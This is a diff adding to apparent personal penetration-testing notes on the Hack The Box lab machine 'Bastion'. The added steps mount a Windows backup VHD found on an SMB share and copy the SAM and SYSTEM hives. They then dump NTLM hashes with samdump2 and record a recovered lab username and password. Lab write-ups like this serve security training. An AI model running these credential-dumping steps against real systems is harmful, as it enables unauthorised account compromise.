@@ -104,6 +104,24 @@ SMB - Win Server 2016 - VHM File - BAckup Win Exploit
         Then we upload:
             sudo mount -t cifs //bastion.htb/Backups/  ~/Desktop/Windows_PrivEsc/Bastion/mnt -o user=anonymous
 
+    Exploit VHD:
+        Kali:
+            We create a vhd folder and store vhd files 
+            guestmount -add /mnt/ WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -V   
+
+        We will dump the NTLM Hashes:
+            find "SAM" and "SYSTEM" Files in System32
+                ls -la System32/config/
+                cp File /Windows/System32/config/SAM /Desktop/FilePath
+                cp File /Windows/System32/config/SYSTEM /Desktop/FilePath
+
+        Extract NTLM Hashes with samdump2:
+            samdump2 /FilePAth/
+
+            user: L4mpje
+            pass: bureaulampje
+
+
 
 
            
